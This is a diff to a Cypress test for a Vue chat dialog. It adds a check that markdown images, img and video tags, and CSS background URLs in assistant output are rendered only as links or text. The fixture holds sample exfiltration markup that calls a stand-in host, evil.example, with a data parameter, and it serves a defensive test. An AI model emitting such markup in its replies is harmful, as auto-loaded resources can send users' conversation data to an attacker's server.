@@ -207,16 +207,35 @@ describe('ChatDialog', () => {
     cy.get('.chat-bubble').should('not.contain', '*   ')
   })
 
+  it('renders images and resource loading markup as links or text only', () => {
+    mountDialog()
+    cy.then(() => {
+      const vm = Cypress.vueWrapper.findComponent(ChatDialog).vm
+      vm.messages = [
+        {
+          id: 1,
+          role: 'assistant',
+          content: '',
+          blocks: [vm.render('![leak](https://evil.example/?d=x) <img src="https://evil.example/a"> <video poster="https://evil.example/b"></video> <span style="background:url(https://evil.example/c)">x</span> <style>.v-main{background:url(https://evil.example/d)}</style>')],
+          pending: '',
+          streaming: false,
+        },
+      ]
+    })
+    cy.get('.chat-bubble a[href="https://evil.example/?d=x"]').should('contain', 'leak')
+    cy.get('.chat-bubble img, .chat-bubble video, .chat-bubble [style], .chat-bubble style').should('not.exist')
+  })
+
   it('shows the server error below the partial answer', () => {
     cy.intercept('POST', '**/cmsapi/chat', {
       headers: { 'content-type': 'text/plain' },
-      body: 'Partial answer\u001EThe response took too long and was stopped.',
+      body: 'Partial answer\u001EThe response took too long and was stopped',
     }).as('chat')
     mountDialog({}, { 'page:chat': true })
     cy.then(() => Cypress.vueWrapper.findComponent(ChatDialog).vm.send('Create a page'))
     cy.wait('@chat')
     cy.get('.chat-bubble.error').should('contain', 'Partial answer')
-    cy.get('.chat-bubble.error .chat-notice').should('have.text', 'The response took too long and was stopped.')
+    cy.get('.chat-bubble.error .chat-notice').should('have.text', 'The response took too long and was stopped')
   })
 
   it('shows the interrupted notice if the end marker is missing', () => {
